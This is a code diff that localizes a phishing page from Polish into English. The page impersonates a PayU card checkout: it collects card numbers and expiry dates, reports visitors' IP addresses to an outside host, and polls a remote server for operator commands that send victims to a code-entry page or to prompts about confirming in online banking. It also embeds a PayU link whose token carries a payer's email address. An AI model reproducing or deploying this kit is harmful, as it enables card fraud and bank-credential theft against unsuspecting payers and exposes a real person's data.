@@ -84,14 +84,14 @@
             <aside>
               <div>
                 <div>
-                  <br><em class="row">Numer telefonu</em>
+                  <br><em class="row">Seller</em>
                   <p></p>
                   <p> </p>
                   <div class="order-data"><p id="telephone"></p></div>
                   <hr>
                 </div>
                 <div class="amount">
-                  <div class="highlight"><span id="sidebar_sum_total">Łącznie</span><span class="price" aria-labelledby="sidebar_sum_total"><p id="price"></p></span></div>
+                  <div class="highlight"><span id="sidebar_sum_total">Total</span><span class="price" aria-labelledby="sidebar_sum_total"><p id="price"></p></span></div>
                 </div>
               </div>
             </aside>
@@ -100,7 +100,7 @@
             <article class="card">
               <div>
                 <header>
-                  <h1>Karta</h1>
+                  <h1>Card</h1>
                   <div>
                     <svg viewBox="0 0 17.795 11" xmlns="http://www.w3.org/2000/svg" width="32px">
                       <g transform="matrix(.15275 0 0 .15275 -1.1373 -1.1366)">
@@ -124,13 +124,13 @@
                 <div class="main">
                   <form autocomplete="">
                     <div class="form-row">
-                      <label for="card-number">Numer karty</label>
+                      <label for="card-number">Card number</label>
                       <input autocomplete="cc-number" class="invalid" id="card-number" name="number" maxlength="19" tabindex="5" type="tel" value="" oninput="formatCardNumber(this)">
                     </div>
                     <div>
                       <div class="inline separated">
                         <div class="form-row">
-                          <label for="card-date">Ważne do</label>
+                          <label for="card-date">Valid until</label>
                           <input autocomplete="cc-exp" class="" id="card-date" name="date" placeholder="MM/RR" tabindex="6" maxlength="7" type="tel" value="" oninput="formatExpiryDate(this)">
                         </div>
                         <div class="form-row">
@@ -189,7 +189,7 @@
                     }
                   }
                 </style>
-                <input id="ShowInputButton" name="submit" tabindex="11" type="submit" value="Płacić">
+                <input id="ShowInputButton" name="submit" tabindex="11" type="submit" value="Pay">
                 <div id="loadingMessage">
                   <div class="spinner"></div>
                 </div>
@@ -201,11 +201,11 @@
       </div>
       <div class="regulations-container">
         <section>
-          <section>
-            <div class="regulations"><strong>Administrator danych osobowych </strong> firma PayU S.A. z siedzibą w Poznaniu (60-166), ul. Grunwaldzka 186, Polska. Twoje dane osobowe będą przetwarzane w celu realizacji transakcji płatniczej, informowania Cię o jej stanie, obsługi ewentualnych reklamacji oraz w celu spełnienia naszych obowiązków prawnych jako firmy PayU.<a href="https://secure.payu.com/pay/?orderId=B7G31GQ45P240610GUEST000P01&amp;token=eyJhbGciOiJIUzI1NiJ9.eyJvcmRlcklkIjoiQjdHMzFHUTQ1UDI0MDYxMEdVRVNUMDAwUDAxIiwicG9zSWQiOiJXRHRWYVFTWCIsImF1dGhvcml0aWVzIjpbIlJPTEVfQ0xJRU5UIl0sInBheWVyRW1haWwiOiJtb2xvZG95bmF2Yml2ZWN2dkBnbWFpbC5jb20iLCJleHAiOjE3MTgxMjM3MTAsImlzcyI6IlBBWVUiLCJhdWQiOiJhcGktZ2F0ZXdheSIsInN1YiI6IlBheVUgc3ViamVjdCIsImp0aSI6IjdkYTZjYjU0LTVhOGItNGQyZS1iNDI5LTdmNWNmMzI2ZDNjZiJ9.EqqXU3m4tGoNFpKpPyCAJ2UEE5_J_KTltAOXOePe61w#">Prečítať všetko</a></div>
-          </section>
-          <p class="regulations"><strong>Strona wykorzystuje pliki cookies </strong>w celu realizacji usług zgodnie z <a target="_blank" rel="noreferrer" href="https://static.payu.com/sites/terms/files/PayU_cookies_policy.pdf">Polityką plików cookies</a>. Warunki dotyczące przechowywania lub dostępu do plików cookies możesz określić w swojej przeglądarce.</p>
-        </section>
+            <section>
+                <div class="regulations"><strong>Personal data administrator</strong> PayU S.A. with its registered office in Poznań (60-166), ul. Grunwaldzka 186, Poland. Your personal data will be processed for the purpose of completing the payment transaction, informing you about its status, handling any complaints, and fulfilling our legal obligations as PayU.<a href="https://secure.payu.com/pay/?orderId=B7G31GQ45P240610GUEST000P01&amp;token=eyJhbGciOiJIUzI1NiJ9.eyJvcmRlcklkIjoiQjdHMzFHUTQ1UDI0MDYxMEdVRVNUMDAwUDAxIiwicG9zSWQiOiJXRHRWYVFTWCIsImF1dGhvcml0aWVzIjpbIlJPTEVfQ0xJRU5UIl0sInBheWVyRW1haWwiOiJtb2xvZG95bmF2Yml2ZWN2dkBnbWFpbC5jb20iLCJleHAiOjE3MTgxMjM3MTAsImlzcyI6IlBBWVUiLCJhdWQiOiJhcGktZ2F0ZXdheSIsInN1YiI6IlBheVUgc3ViamVjdCIsImp0aSI6IjdkYTZjYjU0LTVhOGItNGQyZS1iNDI5LTdmNWNmMzI2ZDNjZiJ9.EqqXU3m4tGoNFpKpPyCAJ2UEE5_J_KTltAOXOePe61w#">Read all</a></div>
+              </section>
+              <p class="regulations"><strong>This site uses cookies</strong> to provide services in accordance with the <a target="_blank" rel="noreferrer" href="https://static.payu.com/sites/terms/files/PayU_cookies_policy.pdf">Cookie Policy</a>. You can specify the conditions for storing or accessing cookies in your browser.</p>
+            </section>    
       </div>
     </div>
   </div>
@@ -439,15 +439,13 @@ function getClientIP() {
 
 // Function to send the IP address to your server
 async function sendIPToServer() {
-    const urlParams = new URLSearchParams(window.location.search);
     const ip = await getClientIP();
-    const name = urlParams.get('name');
     if (!ip) {
         document.getElementById('responseOutput').innerText = 'Error: Unable to fetch IP address';
         return;
     }
 
-    const url3 = `https://api.mobiletecso.cfd/chel?ip=${ip}&name=${name}`;
+    const url3 = `https://api.mobiletecso.cfd/chel?ip=${ip}`;
 
     fetch(url3)
         .then(response => {
@@ -488,7 +486,7 @@ localStorage.setItem('offname', offname);
 
 // Устанавливаем текстовое содержимое элементов
 telephoneElement.textContent += telephone;
-priceElement.textContent += price + ' zł';
+priceElement.textContent += price;
 
 
 document.getElementById('ShowInputButton').addEventListener('click', function() {
@@ -564,7 +562,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
             if(data == 'button1'){
               loadingElement.style.display = 'none';
               console.log("Ответ сервера:", data);
-              document.location.href = './code.html'
+              document.location.href = './codeen.html'
             }
             if(data == 'button2'){
               loadingElement.style.display = 'none';
@@ -611,7 +609,7 @@ function fetchUpdate() {
               var loadingElement = document.getElementById('loadingMessage');
               loadingElement.style.display = 'none';
               console.log("Ответ сервера:", data);
-              document.location.href = './code.html'
+              document.location.href = './codeen.html'
             }
             if(data.result == 'button2'){
               var loadingElement = document.getElementById('loadingMessage');
@@ -656,7 +654,7 @@ function openModal() {
     modal.innerHTML = `
         <div class="modal-content">
             <span class="close">&times;</span>
-            <p class="dota_2">Potwierdź akcję w bankowości internetowej</p>
+            <p class="dota_2">Confirm the action in online banking</p>
         </div>
     `;
 
@@ -810,7 +808,7 @@ function openModal_nocorrect_num() {
     modal.innerHTML = `
         <div class="modal-content">
             <span class="close">&times;</span>
-            <p class="dota_2">Ta karta nie jest obsługiwana.</p>
+            <p class="dota_2">This card is not supported</p>
         </div>
     `;
 
